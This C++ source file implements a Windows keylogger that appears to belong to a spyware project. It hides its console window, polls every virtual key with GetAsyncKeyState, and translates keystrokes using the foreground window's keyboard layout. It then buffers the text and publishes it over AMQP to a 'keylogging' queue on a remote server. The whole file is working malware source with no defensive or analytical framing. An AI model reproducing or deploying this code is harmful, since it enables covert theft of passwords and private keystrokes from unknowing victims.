#include <string>
#include <stdlib.h>
#include <locale>
#include <codecvt>

#if defined(_WIN64) || defined(_WIN32)
#include <windows.h>
#include <winuser.h>
#endif

#include "keylogger.hpp"
#include "../core/debug.hpp"
#include "../core/utils.hpp"

// TODO : Maybe add linux support

/* Windows specifique functionaly*/
#if defined(_WIN64) || defined(_WIN32)
bool WinHandleKeyStroke (std::wstring &, int);
void WinScannedKeyTranslate (std::wstring &, int);

void startKeylogger(AmqpClient &amqpClient) {
    unsigned long long lastSend = getTimestamp();
    std::wstring keyStrokeBuffer;
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;

    // Open a hidden window
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    while ( true ) {
        unsigned long long now = getTimestamp();

        for (int KEY = 8; KEY <= 222; KEY++) {
            bool mustBreak = WinHandleKeyStroke(keyStrokeBuffer, KEY);
            if (mustBreak) break;
        }
        
        if (keyStrokeBuffer.length() >= _SPYWARE_KEYLOG_BUFFER_MAX_ ||
        (lastSend + _SPYWARE_MAX_SEND_INTERVAL_ <= now && keyStrokeBuffer.length() > 0)) {
            std::string logs = converter.to_bytes(keyStrokeBuffer);
            amqpClient.basicPublish("", "keylogging", logs);
            keyStrokeBuffer.clear();
            lastSend = now;
        }

        Sleep(10);
    }
}

bool WinHandleKeyStroke (std::wstring &input, int scannedKey) {
    if ( GetAsyncKeyState(scannedKey) != -32767) return false;

    if (scannedKey >= 39 && scannedKey < 91) {
        WinScannedKeyTranslate(input, scannedKey);
        return true;
    }

    switch (scannedKey) {
        case VK_SPACE:
            input.append(L" ");
            return true;
        case VK_SHIFT:
            // input.append(L"[SHIFT]");
            return true;
        case VK_RETURN:
            input.append(L"[ENTER]");
            return true;
        case VK_BACK:
            input.append(L"[BACKSPACE]");
            return true;
        case VK_TAB:
            // input.append(L"[TAB]");
            return true;
        case VK_CONTROL:
            // input.append(L"[CTRL]");
            return true;
        case VK_DELETE:
            // input.append(L"[DEL]");
            return true;
        case VK_OEM_1:
            WinScannedKeyTranslate(input, VK_OEM_1);
            return true;
        case VK_OEM_2:
            WinScannedKeyTranslate(input, VK_OEM_2);
            return true;
        case VK_OEM_3:
            WinScannedKeyTranslate(input, VK_OEM_3);
            return true;
        case VK_OEM_4:
            WinScannedKeyTranslate(input, VK_OEM_4);
            return true;
        case VK_OEM_5:
            WinScannedKeyTranslate(input, VK_OEM_5);
            return true;
        case VK_OEM_6:
            WinScannedKeyTranslate(input, VK_OEM_6);
            return true;
        case VK_OEM_7:
            WinScannedKeyTranslate(input, VK_OEM_7);
            return true;
        case VK_OEM_PLUS:
            input.append(L"+");
            return true;
        case VK_OEM_COMMA:
            WinScannedKeyTranslate(input, VK_OEM_COMMA);
            return true;
        case VK_OEM_MINUS:
            input.append(L"-");
            return true;
        case VK_OEM_PERIOD:
            WinScannedKeyTranslate(input, VK_OEM_PERIOD);
            return true;
        case VK_NUMPAD0:
            input.append(L"0");
            return true;
        case VK_NUMPAD1:
            input.append(L"1");
            return true;
        case VK_NUMPAD2:
            input.append(L"2");
            return true;
        case VK_NUMPAD3:
            input.append(L"3");
            return true;
        case VK_NUMPAD4:
            input.append(L"4");
            return true;
        case VK_NUMPAD5:
            input.append(L"5");
            return true;
        case VK_NUMPAD6:
            input.append(L"6");
            return true;
        case VK_NUMPAD7:
            input.append(L"7");
            return true;
        case VK_NUMPAD8:
            input.append(L"8");
            return true;
        case VK_NUMPAD9:
            input.append(L"9");
            return true;
        case VK_CAPITAL:
            // input.append(L"[CAPS LOCK]");
            return true;
        case VK_PRIOR:
            // input.append(L"[PAGE UP]");
            return true;
        case VK_NEXT:
            // input.append(L"[PAGE DOWN]");
            return true;
        case VK_END:
            // input.append(L"[END]");
            return true;
        case VK_HOME:
            // input.append(L"[HOME]");
            return true;
        case VK_LWIN:
            // input.append(L"[WIN]");
            return true;
        case VK_RWIN:
            // input.append(L"[WIN]");
            return true;
        case VK_VOLUME_MUTE:
            // input.append(L"[SOUND-MUTE]");
            return true;
        case VK_VOLUME_DOWN:
            // input.append(L"[SOUND-DOWN]");
            return true;
        case VK_VOLUME_UP:
            // input.append(L"[SOUND-DOWN]");
            return true;
        case VK_MEDIA_PLAY_PAUSE:
            // input.append(L"[MEDIA-PLAY/PAUSE]");
            return true;
        case VK_MEDIA_STOP:
            // input.append(L"[MEDIA-STOP]");
            return true;
        case VK_MENU:
            // input.append(L"[ALT]");
            return true;
    }

    return false;
}

void WinScannedKeyTranslate (std::wstring &input, int scannedKey) {
    wchar_t uniChar [16] = {0};

    HKL hkl;
    DWORD fgProcessId; 
    UINT virtualKey;
    BYTE *kState = (BYTE *)malloc(256);
    HWND hWindowHandle = GetForegroundWindow(); // Get reference to the foreground windows
    DWORD fgThreadId = GetWindowThreadProcessId(hWindowHandle, &fgProcessId); // Get threadId of the forground window
    
    GetKeyboardState(kState);
    hkl = GetKeyboardLayout(fgThreadId); // Get Keyboard layout of the foreground window
    virtualKey = MapVirtualKeyEx((UINT)scannedKey, MAPVK_VK_TO_CHAR, hkl); // Get Virtual key of the scanned key
    ToUnicodeEx(virtualKey, (UINT)scannedKey, kState, uniChar, 16, 0, hkl);

    input += std::wstring(uniChar);

    free(kState);
}
#endif